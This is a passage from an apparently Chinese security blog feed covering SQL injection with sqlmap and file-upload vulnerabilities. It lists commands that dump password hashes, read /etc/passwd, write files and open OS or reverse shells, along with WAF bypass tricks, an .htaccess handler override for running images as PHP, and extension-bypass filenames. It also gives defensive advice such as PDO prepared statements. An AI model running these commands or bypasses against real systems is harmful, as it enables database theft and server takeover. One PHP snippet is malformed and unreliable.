&quot;&quot;     #使用referer欺骗(--referer &quot;http://&quot;) </span><br><span class="line">--user-agent &quot;&quot;  #自定义user-agent </span><br><span class="line">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span><br><span class="line">--string=&quot;&quot;    #指定关键词,字符串匹配. </span><br><span class="line">--threads 　　  #采用多线程(--threads 3) </span><br><span class="line">--sql-shell    #执行指定sql命令 </span><br><span class="line">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="line">--file-read    #读取指定文件 </span><br><span class="line">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span><br><span class="line">--file-dest    #要写入的文件绝对路径 </span><br><span class="line">--os-cmd=id    #执行系统命令 </span><br><span class="line">--os-shell     #系统交互shell </span><br><span class="line">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="line">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span><br><span class="line">--os-smbrelay  # </span><br><span class="line">--os-bof       # </span><br><span class="line">--reg-read     #读取win系统注册表 </span><br><span class="line">--priv-esc     # </span><br><span class="line">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span><br><span class="line">--eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 </span><br><span class="line">common-outputs.txt </span><br><span class="line">common-tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle-default-passwords.txt </span><br><span class="line">user-agents.txt </span><br><span class="line">wordlist.txt </span><br><span class="line"></span><br><span class="line">常用语句 :</span><br><span class="line">1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 </span><br><span class="line">2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span><br><span class="line">3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span><br><span class="line">4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span><br><span class="line">5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span><br><span class="line">6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 </span><br><span class="line">7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span><br><span class="line">8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 </span><br><span class="line">9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span><br><span class="line">10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span><br><span class="line">11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span><br><span class="line">14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta </span><br><span class="line">15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span><br><span class="line">19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 </span><br><span class="line">20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner </span><br><span class="line">21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;</span><br></pre></td></tr></table></figure><p>简单的注入流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：简单的注入流程 :</span><br><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</span><br></pre></td></tr></table></figure><p>确定要注入的URL，有时需要获取访问该网站所需的cookie。</p><h3 id="get数据注入-1"><a href="#get数据注入-1" class="headerlink" title="get数据注入"></a>get数据注入</h3><ul><li><p>查询所有的数据库名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; --dbs</span><br></pre></td></tr></table></figure></li><li><p>查询指定数据库的所有表名信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa --table</span><br></pre></td></tr></table></figure></li><li><p>查询指定表名下的所有列名信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa -T users --column</span><br></pre></td></tr></table></figure></li><li><p>查询指定数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure></li></ul><h3 id="post数据注入-1"><a href="#post数据注入-1" class="headerlink" title="post数据注入"></a>post数据注入</h3><p>使用 SQLMap 自动完成 POST 注入，需要把正常 POST 包的内容复制到一个 txt 文档，再调用文档来进行注入。</p><p>先使用 Burpsuite 拦截正常 POST 包，右键 - 选择 Copy to file 复制到 &#x2F;root&#x2F;post.txt</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15618182311836.jpg" alt="img" style="zoom: 33%;"><p>然后关闭 Burpsuite 的代理功能，再使用命令 <code>sqlmap -r /root/post.txt --dbs</code>，来查询数据库名称。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15618184176609.jpg" alt="img" style="zoom:33%;"><p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa --table</code>，查询表名</p><p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa -T users --columns</code>，查询字段名</p><p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa -T users -C user,password --dump</code>，查询用户名和密码内容</p><h2 id="8-SQL注入防护"><a href="#8-SQL注入防护" class="headerlink" title="8. SQL注入防护"></a>8. SQL注入防护</h2><h3 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h3><p>addslashes()、魔术引号开关、mysql_real_escape_string</p><p><u>会对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义</u>，会影响SQL注入语句中的路径信息。</p><p><strong>绕过方法</strong>：</p><p>宽字节（待转义字符前加上%df）、</p><h3 id="整数过滤"><a href="#整数过滤" class="headerlink" title="整数过滤"></a>整数过滤</h3><p>遇到 is_int() 函数过滤输入的情况：直接跑路，无法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_int</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ni shi ge jj?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>str_replace(‘被过滤参数’,’过滤参数’,$id)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_</span> GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_</span> GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 第一个参数是要过滤的值，第二个参数是过滤后的值</span></span><br><span class="line"><span class="variable">$id</span>=str_ <span class="title function_ invoke__">replace</span>(<span class="string">&#x27;select&#x27;</span> , <span class="string">&#x27;fuck&#x27;</span> ,<span class="variable">$id</span>)</span><br><span class="line"><span class="comment">// logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>-<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤效果：select变成了fuck</p><h3 id="waf防护软件"><a href="#waf防护软件" class="headerlink" title="waf防护软件"></a>waf防护软件</h3><p>阿里云盾、安全狗、宝塔</p><p>作用机制：过滤关键字</p><p><strong>绕过方法</strong>：</p><ol><li><p>更改提交方法（get、post）</p></li><li><p><strong>大小写混合</strong>（绕开黑名单）</p></li><li><p><strong>解密编码类</strong>（绕开黑名单）</p><p>%0A为换行符；%23为#号；%20为空格</p></li><li><p><strong>注释符号混用</strong>（绕开注释过滤）</p><p>比如<code>/**/</code>、<code>/*!*/</code></p></li><li><p>等价函数替换（绕开关键字过滤）</p></li><li><p>特殊符号混用（绕开关键字过滤）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">空格被过滤，用%a0代替；</span><br><span class="line">and和or被过滤：可以用&amp;&amp;和||来替代；</span><br></pre></td></tr></table></figure></li><li><p>借助数据库特性（多种SQL语句）</p></li><li><p><strong>HTTP参数污染</strong></p><p>函数java_implimentation()的逻辑有严重错误： 一旦这个数组里的个数不止1个，并且每个组员都是id开头，那么返回只会返回第一个组员。比如id&#x3D;1&amp;id&#x3D;sql_injection的结果为为id&#x3D;1。但是<code>$id=$_GET[&#39;id&#39;]</code>取的是最后一个id，所以我们只需要把payload放在后面的id就好。</p></li><li><p><strong>垃圾数据溢出</strong></p><p>waf只能匹配一千个，多了就不行了</p></li></ol><h3 id="使用预编译PDO"><a href="#使用预编译PDO" class="headerlink" title="使用预编译PDO"></a>使用预编译PDO</h3><p>PDO 是 PHP Data Objects（PHP 数据对象）的缩写。是在 PHP5.1 版本之后开始支持的技术。不使用 PDO 技术时，SQL 语句是先在本地拼接完成后，再传递至数据库处理，所以会导致用户提交有猫腻的变量来改变原 SQL 语句的结构，从而实现 SQL 注入；使用 PDO 技术后，是<strong>先把 SQL 语句的整体语法，匹配的参数用 <code>?</code> 当做占位符一起发送至数据库，然后再把用户提交的查询参数发送至数据库，由数据库来完成变量的转移处理。</strong>用户输入只会被当成字符串字面值参数，而SQL语句则经过语法分析，生成执行命令。这样 SQL 语句的整体语法结构和变量分开两次传递至数据库，从而导致那些有猫腻的变量无法再改变 SQL 语句的原始结构。这种情况下，SQL 注入攻击几乎无法实现。这也是目前比较有效的防御 SQL 注入攻击的方法之一。</p><p>SQL关键字<strong>无法进行预编译</strong>，如表名或者列名字段，order by + 列名，in + 列名。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/png/2476579/1</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="https://frankcao3.github.io/posts/11796"/>
    <id>https://frankcao3.github.io/posts/11796</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.976Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627433334141-cb693e43-53e8-4e28-80b9-b2c08e23f2f6.png" alt="web漏洞文件上传.png"></p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>文件上传漏洞是指用户上传了一个<strong>可执行的脚本文件webshell</strong>，而且通过这个脚本文件获得了执行服务器端命令的能力。</p><p>Webshell 以 ASP、PHP、JSP 等网页文件形式存在的一种命令执行环境，也称其为一种网页后门，通过 Webshell 可以对所在服务器进行远程管理。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>非法用户可以利用上传的恶意脚本文件WebShell控制整个网站，甚至控制服务器。也可将WebShel脚本称为一 种网页后门，WebShel脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p><ul><li>网站被植入黑链（博彩、黄色）</li><li>挖矿</li><li>文件泄露</li></ul><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>前端或者服务端代码未对客户端上传的文件进行严格的验证和过滤。</p><p>文件上传漏洞发生的<strong>前提</strong></p><p>1、网站上传功能能正常使用<br>2、文件类型允许上传<br>3、上传路径可以确定<br>4、文件可以被访问，可以被执行或被包含</p><h2 id="查找和判断"><a href="#查找和判断" class="headerlink" title="查找和判断"></a>查找和判断</h2><p>黑盒查找：不知道源代码情况下，通过目录扫描和网站应用，以及通过网站后台、会员中心进行获取权限，需要自己判断。</p><p>白盒查找：通过源代码分析文件上传漏洞。</p><p>判断：通过抓包分析</p><h2 id="文件上传的分类"><a href="#文件上传的分类" class="headerlink" title="文件上传的分类"></a>文件上传的分类</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627433817849-28573285-fa9c-4d1d-9864-2f822f372ee5.png" alt="文件上传利用思路.png"></p><ul><li><p>常规类</p></li><li><p>CMS类</p><p>CMS 又叫网站内容管理系统（网站的模版，帮助我们快速建站，我们会在这个网站模板上做二次开发），市面上很多开源的CMS 的历史版本有很多都存在着文件上传漏洞，但是产生文件上传漏洞的原因不尽相同。</p><p>比如常见的dedeCMS（织梦）、PHPcms、Seacms 等。</p><p>参考：<a href="https://blog.csdn.net/qq_35733751/article/details/115317967">https://blog.csdn.net/qq_35733751/article/details/115317967</a></p></li><li><p>编辑器类</p><p>编辑器就是网站后台编辑网页的在线编辑器，会自动集成文件上传功能，这些编辑器的某些版本也存在文件上传漏洞，从而进行getshell</p><p>比如ewebeditor、fckeditor。</p><p>参考：<a href="https://www.likecs.com/show-203442332.html">https://www.likecs.com/show-203442332.html</a></p></li><li><p>CVE</p><p>比如，Weblogic任意文件上传漏洞( CVE-2018-2894 )</p></li></ul><h2 id="文件上传的利用"><a href="#文件上传的利用" class="headerlink" title="文件上传的利用"></a>文件上传的利用</h2><ul><li><p><strong>找到上传的位置</strong></p><p>常规文件上传地址的获取说明：</p><p>比如搜索引擎搜索<code>inurl:upload.php</code>、网站的目录扫描（<strong>御剑</strong>）、针对网站搜索upload关键词<code>site:abc.com upload</code>、网站自身的应用（上传头像、图片等）。</p></li><li><p><strong>尝试绕过校验，上传php文件</strong></p><p>upload-fuzz-dic-builder 上传漏洞fuzz字典生成脚本：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a></p><p>文件上传攻击一般配合文件解析漏洞，比如nginx解析漏洞。具体可以看文件上传攻击的防护及绕过。</p></li><li><p><strong>获得文件位置</strong></p><p>上传文件后，要想执行，必须先获取文件路径。可以拖动上传的文件到新标签页得到文件路径，或者看看URL、或者看网站有没有查看所上传文件的地方。</p></li><li><p><strong>蚁剑&#x2F;菜刀连接，管理文件</strong></p></li></ul><h2 id="文件上传攻击的防护及绕过"><a href="#文件上传攻击的防护及绕过" class="headerlink" title="文件上传攻击的防护及绕过"></a>文件上传攻击的防护及绕过</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627433334141-cb693e43-53e8-4e28-80b9-b2c08e23f2f6.png" alt="img"></p><p>**使用github上的靶场：<code>upload labs</code>**（场景比DVMA更丰富），下载下来放在本地网站localhost里（phpstudy或者apache+php）。</p><p>fuzz字典：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder%EF%BC%8C%E5%8C%85%E5%90%AB%E5%8F%AF%E8%83%BD%E7%9A%84%E6%94%BB%E5%87%BB%E8%AF%AD%E5%8F%A5%E3%80%82%E7%BB%93%E5%90%88BP%E4%BD%BF%E7%94%A8%E3%80%82">https://github.com/c0ny1/upload-fuzz-dic-builder，包含可能的攻击语句。结合BP使用。</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728153545912.png" alt="image-20220728153545912"></p><h3 id="防护思路"><a href="#防护思路" class="headerlink" title="防护思路"></a>防护思路</h3><ol><li><p>后端验证：采用服务端验证模式（不采用前端验证） </p></li><li><p>下面三种检测方式同时进行：</p><ul><li><p>后缀检测：基于黑名单，白名单过滤</p></li><li><p>MIME 检测：基于上传自带类型检测</p></li><li><p>内容检测：文件头，完整性检测</p></li></ul></li><li><p>自带函数过滤（就PHP脚本而言） </p><p>比如getimagesize()函数检查文件头；exif_imagetype()函数检查文件类型等等</p></li><li><p>自定义函数过滤：function check_file(){}</p><p>结合黑名单和白名单，可以两者相互嵌套</p></li><li><p>WAF 防护产品：宝塔，云盾，安全公司产品等</p><p>如果存在waf,就无法判断是否存在文件上传漏洞，只有一一尝试。</p></li></ol><h3 id="1-前端限制文件类型（白名单）"><a href="#1-前端限制文件类型（白名单）" class="headerlink" title="1. 前端限制文件类型（白名单）"></a>1. 前端限制文件类型（白名单）</h3><p>破解方法一：直接F12，删除（禁用）前端的限制文件类型的JS脚本。上传成功后，拖动图片到新标签页得到文件路径。</p><p>破解方法二：先上传网站允许的文件后缀，然后BP抓包修改文件后缀为php。</p><h3 id="2-MIME类型"><a href="#2-MIME类型" class="headerlink" title="2. MIME类型"></a>2. MIME类型</h3><p>参考upload-labs Pass-2。</p><p>在访问网页时，MIME type帮助浏览器识别一个HTTP请求返回的是什么内容的数据，应该如何打开、如何显示。<strong>作用和文件拓展名相似，但不同的是它并非标注文件，而是在邮件和HTTP协议中用来标注网络数据的。</strong></p><p>客户端使用:</p><p>1、GET请求不需要这个字段。<br>2、POST请求头，放在<strong>Content Type字段</strong> 用来指定上传的文件类型，方便服务器解析。放在Accept, 告诉服务端允许接收的响应类型。比如只能接收json或者其他。</p><p>服务端使用:</p><p>1、放在响应头里面，<strong>Content Type</strong> 告诉客户端响应的数据类型，方便客户端解析。</p><table><thead><tr><th>MIME</th><th>描述</th></tr></thead><tbody><tr><td>text&#x2F;html</td><td>HTML格式</td></tr><tr><td>application&#x2F;json</td><td>JSON数据格式</td></tr><tr><td>multipart&#x2F;form-data</td><td>文件上传(二进制数据)</td></tr><tr><td>image&#x2F;jpeg、image&#x2F;gif、image&#x2F;pjpeg</td><td>jpg、gif、pjpeg图片格式</td></tr></tbody></table><p>MIME类型的确定根据的是文件扩展名。</p><p>破解方法：BP抓包，修改MIME类型为image&#x2F;jpeg即可绕过上传。</p><h3 id="3-文件后缀黑名单"><a href="#3-文件后缀黑名单" class="headerlink" title="3. 文件后缀黑名单"></a>3. 文件后缀黑名单</h3><p>参考upload-labs Pass-4。</p><p>禁止asp、php等类型文件上传。</p><p>破解方法：使用等价扩展名。</p><table><thead><tr><th>语言</th><th>等价扩展名</th></tr></thead><tbody><tr><td>asp</td><td>asa,cer,cdx</td></tr><tr><td>aspx</td><td>ashx,asmx,ascx</td></tr><tr><td>php</td><td>php2、 php3、 php4、 php5、 phps、 phtml</td></tr><tr><td>jsp</td><td>jspx.jspf</td></tr></tbody></table><p><strong>文件后缀绕过</strong></p><p>文件后缀绕过攻击是服务端代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其他文件后缀的，例如在httpd.conf中，如果<strong>增加其他后缀</strong>为<code>shell.php.phtml</code>，则能够解析php和phtml文件。</p><p>在Apache的<strong>解析顺序</strong>中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止，所以如果上传的文件名类似<code>1.php.xxxx</code>，因为后缀xxxx不可以解析，所以向左解析后缀php。而服务器如果使用php的pathinfo()来获取文件后缀，那么只会看到后缀xxxx，因此实现了绕过。</p><h3 id="4-很全的黑名单-大小写模糊（-htaccess绕过）"><a href="#4-很全的黑名单-大小写模糊（-htaccess绕过）" class="headerlink" title="4. 很全的黑名单+大小写模糊（.htaccess绕过）"></a>4. 很全的黑名单+大小写模糊（.htaccess绕过）</h3><p>黑名单更多了一些，不过没有过滤<code>.htaccess</code>后缀，参考upload-labs Pass-4。</p><p>先按照如下代码块的内容写一个新的<code>.htaccess</code>文件，然后上传，使其处于所有上传文件所在的目录。</p><blockquote><p>htaccess: Hypertext Access(超文本入口)<br>它是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。<br>作用：伪静态、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test.png&quot;&gt;  </span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">AddType application/x-httpd-php png</span><br></pre></td></tr></table></figure><p>然后将php文件修改为<code>.htaccess</code>文件所指定的图片文件后缀或文件名，然后上传。因为.htaccess文件被修改，所以直接访问该图片文件时其会被服务器当作PHP文件解析。</p><p><strong>.htaccess生效的前提：</strong></p><p>httpd.conf设置AllowOverride all，而不是none，所以phpstudy集成的apache会无法实验成功。</p><h3 id="5-黑名单过滤，没有考虑大小写"><a href="#5-黑名单过滤，没有考虑大小写" class="headerlink" title="5. 黑名单过滤，没有考虑大小写"></a>5. <strong>黑名单过滤，没有考虑大小写</strong></h3><p>过滤htaccess后缀，但是没有过滤php全部的大小写，使用后缀pHp即可绕过上传。参考upload-labs Pass-5。</p><p><code>shell.pHp</code></p><h3 id="6-黑名单过滤，没有对后缀去空"><a href="#6-黑名单过滤，没有对后缀去空" class="headerlink" title="6. 黑名单过滤，没有对后缀去空"></a>6. 黑名单过滤，没有对后缀去空</h3><p>在判断后缀名的时候没有先去除多余的空格。参考upload-labs Pass-6。</p><p>后缀名后添加空格即可绕过后端php脚本的检测，再上传到windows服务器上，会自动去除后缀名后的空格。</p><p><code>shell.php </code>（php后面有空格）</p><h3 